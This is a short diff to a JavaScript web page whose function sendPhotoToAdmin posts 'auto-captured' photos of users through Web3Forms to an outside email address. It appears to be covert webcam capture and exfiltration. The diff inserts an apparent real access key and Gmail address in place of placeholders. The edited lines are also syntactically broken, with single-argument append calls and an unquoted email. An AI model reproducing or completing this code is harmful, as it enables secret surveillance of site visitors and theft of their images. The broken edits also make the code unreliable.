@@ -336,9 +336,9 @@ async function sendPhotoToAdmin(photoData) {
         const blob = await fetch(photoData).then(res => res.blob());
         
         // If using Web3Forms (uncomment and add your access key)
-        formData.append('access_key', 'YOUR_WEB3FORMS_ACCESS_KEY'); // Get from web3forms.com
+        formData.append('f5bdda81-92f8-4595-a2e8-a6107db5feef'); // Get from web3forms.com
         formData.append('subject', `Auto-captured Photo ${photoCount}`);
-        formData.append('email', ADMIN_EMAIL);
+        formData.append(editing2213@gmail.com);
         formData.append('message', `Auto-captured photo from user. Time: ${new Date().toLocaleString()}`);
         formData.append('photo', blob, `photo_${Date.now()}.jpg`);
         
@@ -484,4 +484,5 @@ window.addEventListener('beforeunload', () => {
 });
 
 // initialize the scene
+
 init();
